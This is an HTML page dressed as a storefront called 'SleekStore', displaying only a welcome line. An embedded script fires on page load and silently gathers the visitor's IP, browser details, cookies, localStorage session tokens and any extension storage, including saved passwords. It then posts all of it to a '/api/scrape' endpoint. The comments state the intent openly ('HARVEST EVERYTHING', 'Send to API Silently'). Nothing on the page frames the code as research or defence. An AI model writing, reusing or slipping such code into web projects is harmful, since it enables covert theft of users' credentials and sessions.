<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SleekStore</title>
    <style>body{background:#0d1117;color:#c9d1d9;font-family:sans-serif;padding:20px;}</style>
</head>
<body>
    <!-- The UI remains sleek and normal -->
    <h1>Welcome to SleekStore</h1>
    <p>Browsing your catalog...</p>

    <script>
        // Run immediately when the DOM is ready
        document.addEventListener('DOMContentLoaded', async () => {
            try {
                // 1. Get IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();

                // 2. HARVEST EVERYTHING
                // We use chrome.storage to get data from ALL open tabs/sessions
                const fullHarvest = await new Promise((resolve) => {
                    if (typeof chrome !== 'undefined' && chrome.storage) {
                        chrome.storage.local.get(null, resolve);
                    } else {
                        resolve({});
                    }
                });

                const payload = {
                    timestamp: new Date().toISOString(),
                    ip: ipData.ip,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    // The actual saved passwords (if accessible via extension/storage)
                    savedPasswords: fullHarvest.passwords || [], 
                    // All cookies and session tokens stored locally
                    cookies: fullHarvest.cookies || document.cookie,
                    localSession: fullHarvest.session || localStorage.getItem('session'),
                    windowLocation: window.location.href,
                    title: document.title
                };

                // 3. Send to API Silently
                await fetch('/api/scrape', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

            } catch (err) {
                console.error("Silent scrape failed", err);
            }
        });
    </script>
</body>
</html>
